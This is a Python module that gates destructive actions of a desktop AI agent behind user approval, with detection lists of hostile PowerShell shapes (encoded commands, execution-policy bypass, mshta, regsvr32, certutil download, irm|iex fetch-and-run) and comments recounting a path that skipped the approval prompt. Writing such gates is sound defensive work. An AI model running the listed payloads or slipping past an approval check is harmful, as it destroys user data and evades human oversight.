"""
Destruction gate — classifies actions and gates destructive ones.
"""

from __future__ import annotations

import logging
import re

log = logging.getLogger("addled.gate")

DESTRUCTIVE_ACTIONS = {
    "delete_file", "close_app", "close_window",
    "run_command",  # depends on command content
    # Both of these can replace a file, and `move` can put a folder inside
    # another one. Gated for the same reason `delete_file` is: the user is told
    # before something they already have is overwritten. `requires_approval=True`
    # on the skill is what raises the card; naming them here is what makes the
    # gate's own answer agree with the card, so a grant works and the dashboard
    # is told the truth about what can ask.
    "move_file", "copy_file",
    # Types a line into a live shell, so it is the third door into the same
    # PowerShell `run_command` opens. Named here for the reason the two above
    # are: the `requires_approval` flag on the skill raises the card, and this
    # is what makes the GATE agree. Without it the two paths disagreed -
    # `registry.execute` (a chat turn) asked, while `executor.execute` (the
    # `action.execute` socket, which is what the dashboard and a bot use) ran
    # the command and deleted the file. Found by testing the installed app
    # after the skill flag alone had passed every in-process check.
    "session_send",
}

# Compound commands whose danger is in the whole name rather than in a single
# dangerous word, so the prefix rule cannot see them without also gating
# harmless names that happen to share a stem.
#
# `restart-computer` and `format-report` are structurally identical — a bare
# entry followed by a hyphen — and no punctuation rule can separate a cmdlet
# from a filename. Rather than guess, the ambiguous few are listed, and the
# punctuation rule stays conservative (a hyphen does NOT end a command word)
# so `format-report`, `cipher-check` and `logoff-report` are not gated as
# `format`, `cipher` and `logoff`.
COMPOUND_DANGEROUS = {
    "restart-computer", "stop-computer", "format-volume", "clear-disk",
    "remove-partition", "remove-item -recurse -force", "stop-process -force",
    "reset-computer", "start-process -verb runas",
}

# Characters that can follow a command word. Everything else is treated as part
# of the word, so `delete` is not `del` and `format-report` is not `format`.
# Defined once because the prefix rule and the compound rule must agree about
# where a command ends.
WORD_BOUNDARY = " \t/\\:=;|&>\"'"

def command_stem(entry: str) -> str:
    """The bare name of a dangerous-command entry, separator removed ONCE.

    Shared with `backend.approvals.policy` so the gate that decides what to ask
    about and the policy that decides what may be remembered cannot drift into
    disagreeing about what a dangerous command is.

    Deliberately not `rstrip("/\\\\")`: that strips the whole character set, so
    `"del "` / `"del/"` / `"del\\t"` all became `"del"` and swept in `delete`.
    """
    return str(entry or "").strip().rstrip("/\\").strip()

def matches_dangerous(cmd: str, entry: str) -> bool:
    """Does this command begin with this dangerous-command entry?

    `entry` comes from `terminal.DANGEROUS_COMMANDS`, which is a set of
    *prefixes* written the way a person types them: `"del "`, `"del/"`,
    `"rm -rf"`, `"reg delete"`.

    The obvious implementation — `cmd.startswith(entry.rstrip("/\\"))` — is
    wrong, and was the cause of safe commands being gated. `str.rstrip` takes a
    CHARACTER SET, not a suffix, so it strips every trailing slash and
    backslash, and the set contains `"del "`, `"del\\t"` and `"del/"`, which all
    collapse to `"del"`. The gate then flagged anything starting with `del` —
    `delete`, `delete-item` — and `"rd "` collapsed to `"rd"`, taking `rdp` with
    it. A safe command was reported as destructive, so the turn ended asking for
    permission the user should never have been asked for.

    Matching is therefore done on the entry with its own trailing separator
    removed ONCE, and the comparison insists on a word boundary: the command
    must either equal the stem or continue with something that cannot be part
    of the same word (a space, a separator, or a punctuated flag).
    """
    entry = str(entry or "").strip()
    if not entry:
        return False
    stem = command_stem(entry)
    if not stem or not cmd.startswith(stem):
        return False
    rest = cmd[len(stem):]
    if not rest:
        return True  # exactly the command
    # `del/q` and `del /q` are the command; `delete` is not.
    #
    # Two characters are deliberately NOT boundaries:
    #   `-` joins one word — `format-report`, `cipher-check` and
    #       `restart-computer-notes.txt` are names, not commands.
    #   `.` introduces a file extension far more often than it separates a
    #       command, so `restart.json` is a filename and not a reboot.
    # The compounds this would otherwise miss are named in COMPOUND_DANGEROUS,
    # which is the honest answer for the ambiguous few rather than a punctuation
    # rule that guesses between a cmdlet and a filename.
    return rest[0] in WORD_BOUNDARY

def is_compound_dangerous(cmd: str) -> bool:
    """Is this one of the named compound commands?

    Matched as a whole word for the same reason as everything else: the
    command must equal the name or continue past it at a boundary, so
    `restart-computer-notes.txt` is a filename and not a reboot.
    """
    for name in COMPOUND_DANGEROUS:
        stem = command_stem(name)
        if cmd == stem:
            return True
        if cmd.startswith(stem):
            rest = cmd[len(stem):]
            if rest and rest[0] in WORD_BOUNDARY:
                return True
    return False


# PowerShell's own destructive verbs. The prefix table in `terminal.py` is
# written the way cmd.exe spells things (`del`, `rd /s`, `rm -rf`), and Addled
# does not run cmd.exe - it runs `powershell.exe -Command`. So the table was
# matching a language the shell never speaks: `del` was gated, and the
# `Remove-Item` the model is far more likely to write was not.
#
# Matched as a verb at a word boundary, so `Remove-Computer` is caught while
# `Remove-ItemNotes` and a file called `remove-notes.md` are not.
_POWERSHELL_DANGEROUS_VERBS = (
    "remove-item", "remove-itemproperty", "clear-content", "clear-item",
    "remove-localuser", "remove-localgroupmember", "remove-partition",
    "set-executionpolicy", "set-mppreference", "stop-service",
    "disable-computerrestore", "initialize-disk", "new-localuser",
    "set-localuser", "add-computer", "clear-recyclebin", "stop-process",
    "remove-computer", "uninstall-", "remove-windowsfeature",
)

# Ways of hiding a command from a prefix test. Each one ends in another command,
# so if what follows is dangerous the whole line is. Nothing here is a command
# itself - these are the wrappers that made a destructive line look innocuous.
_INDIRECTION = ("iex ", "invoke-expression", "& ", "cmd /c", "cmd.exe /c",
                "powershell -command", "powershell.exe -command",
                "start-process", "call ")


def _is_destructive_powershell(cmd: str) -> bool:
    """Does this PowerShell line delete, disable or reconfigure something?

    A word list is a weak instrument and this one does not pretend otherwise:
    it catches the verbs that matter and the common ways of hiding them, and
    `requires_approval` defaults to False the moment a command matches nothing.
    That default is why the name check above it must be decisive.
    """
    c = str(cmd or "").strip().lower()
    if not c:
        return False
    for verb in _POWERSHELL_DANGEROUS_VERBS:
        idx = c.find(verb)
        if idx == -1:
            continue
        # Only at the start or after something that cannot continue a word, so
        # `remove-notes.md` is a filename and `Remove-Item` is not.
        if idx == 0 or c[idx - 1] in WORD_BOUNDARY or c[idx - 1] == ";":
            return True
    # A wrapper around a dangerous command is a dangerous command.
    if any(w in c for w in _INDIRECTION):
        return True
    return False



# ---------------------------------------------------------------------------
# Structural rules: what a command is BUILT OUT OF, not what words it holds.
#
# The word list above matches names. Measured against the live install, five
# real payloads passed it: `powershell -enc SQBFAFgA`, `pwsh -c irm
# http://x/a.ps1`, `certutil -urlcache`, `mshta`, `regsvr32 /s /i:http://x`,
# and `Copy-Item -Recurse -Force C:/a C:/b` - the last being the very example
# the word list's own comment says it exists to catch, because `copy-item` is
# not one of its verbs.
#
# These rules read shape instead. Each describes a capability (hide a payload,
# proxy execution through another binary, download and run, copy a tree)
# rather than a spelling, so rewording does not evade it.
# ---------------------------------------------------------------------------

# Flags whose purpose is to hide what actually runs.
_OBFUSCATION_FLAGS = (
    "-enc ", "-encodedcommand", "-executionpolicy bypass", "-ep bypass",
    "-exec bypass", "-windowstyle hidden",
)

# Binaries that exist mainly to run or fetch something else.
_LOLBINS = (
    "mshta", "regsvr32", "rundll32", "bitsadmin", "certutil", "wmic ",
    "invoke-webrequest", "invoke-restmethod", "start-bitstransfer",
    "downloadstring", "downloadfile", "iex ", "invoke-expression",
    # PowerShell aliases of the above. `irm` IS Invoke-WebRequest, so a rule
    # that only knew the long form missed `pwsh -c irm http://x/a.ps1`.
    "irm ", "iwr ",
)

# Fetching is not the danger; fetching and RUNNING is. `curl` and `wget` are
# left out of `_LOLBINS` on purpose - a read-only fetch is a legitimate thing
# for an agent to do, and gating it would train the user to approve without
# reading. They are gated only when paired with an executor below.
_FETCHERS = ("irm ", "iwr ", "curl ", "wget ", "invoke-webrequest",
             "invoke-restmethod", "certutil -urlcache", "start-bitstransfer")

# A payload leaving the page and becoming a process.
_EXECUTORS = ("| iex", "|iex", "| invoke-expression", "|invoke-expression",
              " -outfile", "downloadstring", "-o ", "-outfile")

# Recursive tree operations. `-recurse` turns a one-file operation into a
# whole tree, which is the difference between a mistake and a loss.
_RECURSIVE_VERBS = ("copy-item", "move-item", "remove-item", "rm ",
                    "rmdir", "rd /s", "del /", "cp ", "mv ", "rsync")

# Shapes the classifier cannot resolve with confidence. Present -> gate.
#
# Only constructs that BUILD CODE belong here. A bare `$(` or a backtick is
# ordinary PowerShell - `echo $(Get-Date)`, `git commit -m \`date\`` - and
# gating it made the gate cry wolf on the daily driver, which is how a gate
# gets switched off. What matters is the case where the output becomes a
# command: `& $(...)`, `iex (...)`, `[scriptblock]::Create`.
_UNREADABLE = (
    "& $(", "iex (", "invoke-expression (", "| iex",
    "[scriptblock]", "add-type",
)


def is_structurally_dangerous(cmd: str) -> bool:
    """Does this command have the SHAPE of something that must be approved?

    Generous on purpose: a false positive costs one approval card, and a false
    negative is a command the user never saw.
    """
    c = " ".join(str(cmd or "").lower().split())
    if not c:
        return False
    if any(flag in c for flag in _OBFUSCATION_FLAGS):
        return True
    if any(b in c for b in _LOLBINS):
        return True
    # Fetch-then-run, in either order. Piping a download into an interpreter
    # is the canonical one; `-OutFile` says the fetched bytes are being kept
    # somewhere, which is only interesting when a second step runs them, so
    # that alone is not enough.
    # Any pipe out of a fetcher is enough: whatever is downstream is being
    # handed fetched bytes it will interpret. `curl ... | bash` and
    # `wget -qO- ... | sh` are the classic shape, and `| iex` is PowerShell's.
    if any(f in c for f in _FETCHERS) and "|" in c:
        return True
    if "downloadstring" in c or "downloadfile" in c:
        return True
    # `-Recurse` and the short-flag aliases that mean the same thing. Matched
    # as whole flags so `-r` does not fire on `-ref` or a bare `-run`.
    recursive = "-recurse" in c or re.search(r"(^|\s)-r(\s|$)", c)
    if recursive and any(v in c for v in _RECURSIVE_VERBS):
        return True
    if any(s in c for s in _UNREADABLE):
        return True
    return False

class DestructionGate:
    """Classifies actions as safe or destructive."""

    def classify(self, action_type: str) -> str:
        if action_type in DESTRUCTIVE_ACTIONS:
            return "destructive"
        return "safe"

    def requires_approval(self, action_type: str, params: dict) -> bool:
        # A name in DESTRUCTIVE_ACTIONS is destructive by NAME, and that answer
        # must not be reachable-around. It used to be for `run_command`: the
        # content branch below returned early, so `run_command`'s own membership
        # was never consulted and a command the content list did not happen to
        # name - `Remove-Item ... -Recurse -Force` - came back as not
        # destructive. The chat path still asked, because the SKILL carries
        # `requires_approval`; `executor.execute`, which is what the dashboard
        # and a bot reach over `action.execute`, ran it. Measured on the
        # installed app: the file was deleted, with no prompt.
        #
        # So the name check comes FIRST and is decisive. Content can only ever
        # ADD to it (a shell command is dangerous in ways a name list cannot
        # know), never take away.
        if action_type in DESTRUCTIVE_ACTIONS:
            if action_type != "run_command":
                return True
            # `run_command` still honours a remembered session grant for a SAFE
            # command, or `dir` would prompt every single time and train the
            # user to approve without reading. So its content is consulted - but
            # only to decide whether to ask, never to decide it is safe to skip
            # the name check above.
            cmd = str(params.get("command", "") or "").strip()
            if not cmd:
                return False  # nothing to run
            # Shape first. A word list can only match names it was told about,
            # and five measured payloads were written in ways it never was
            # (`-enc`, `irm|iex`, `certutil`, `mshta`, `Copy-Item -Recurse`).
            # This is also the fail-closed half: anything built from a shape
            # the classifier cannot read is gated rather than assumed safe.
            if is_structurally_dangerous(cmd):
                return True
            lowered = cmd.lower()
            if is_compound_dangerous(lowered):
                return True
            # The canonical dangerous-command set from terminal.py, so there is
            # exactly one list to keep in sync. `Remove-Item` and the other
            # PowerShell spellings are matched here rather than in the prefix
            # table, because this is the shell Addled actually runs.
            from backend.actions.terminal import DANGEROUS_COMMANDS
            if any(matches_dangerous(lowered, c) for c in DANGEROUS_COMMANDS):
                return True
            return _is_destructive_powershell(lowered)
        if action_type == "delete_file":
            return True
        return False
